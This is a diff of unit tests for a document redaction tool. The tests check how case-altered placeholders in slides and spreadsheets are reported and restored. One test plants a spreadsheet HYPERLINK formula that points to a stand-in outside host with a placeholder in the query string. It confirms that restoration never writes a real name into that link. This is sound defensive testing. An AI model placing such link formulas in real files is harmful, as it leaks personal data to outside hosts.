@@ -550,3 +550,25 @@ test("the practice deck redacts cleanly with the Dalton key opened first: the ke
   assert.ok(res.text.includes(key.entries.find((e) => e.value === "Keisha Daniels").placeholder));
   assert.ok(!res.text.includes("Keisha"));
 });
+
+test("restoring a file: placeholders Claude wrote differently are reported, and restored only when asked", async () => {
+  const { session, res } = await redact("deck.pptx");
+  const entries = [...(await O.readZip(res.bytes))];
+  const slide = entries.find((e) => /^ppt\/slides\/slide\d+\.xml$/.test(e.name) && /\[PERSON-01\]/.test(dec.decode(e.data)));
+  assert.ok(slide, "a slide names [PERSON-01]");
+  const changed = await edit(res.bytes, slide.name, (x) => x.replace("[PERSON-01]", "[Person-01]"));
+  const r = await O.restorePackage(await O.open(changed), session.key);
+  assert.deepEqual(JSON.parse(JSON.stringify(r.variants)), [["[Person-01]", 1]]);
+  assert.match(await part(r.bytes, slide.name), /\[Person-01\]/);
+  const l = await O.restorePackage(await O.open(changed), session.key, 0, true);
+  assert.deepEqual(JSON.parse(JSON.stringify(l.variants)), []);
+  assert.doesNotMatch(await part(l.bytes, slide.name), /\[Person-01\]|\[PERSON-01\]/);
+  assert.match(await part(l.bytes, slide.name), /Rachel Kim|Marcus Webb|Taylor Brooks/);
+});
+
+test("restoring placeholders written differently still never puts a real value inside a workbook link", async () => {
+  const { session, res } = await redact("book.xlsx", { sheetActions: undefined });
+  const link = await edit(res.bytes, "xl/worksheets/sheet1.xml", (x) => x.replace("<f>SUM(E2:E4)</f>", '<f>HYPERLINK("https://x.example/?u=Person-01","[Person-01]")</f>'));
+  const r = await O.restorePackage(await O.open(link), session.key, 0, true);
+  assert.match(await part(r.bytes, "xl/worksheets/sheet1.xml"), /<f>HYPERLINK\("https:\/\/x\.example\/\?u=Person-01","\[Person-01\]"\)<\/f>/);
+});
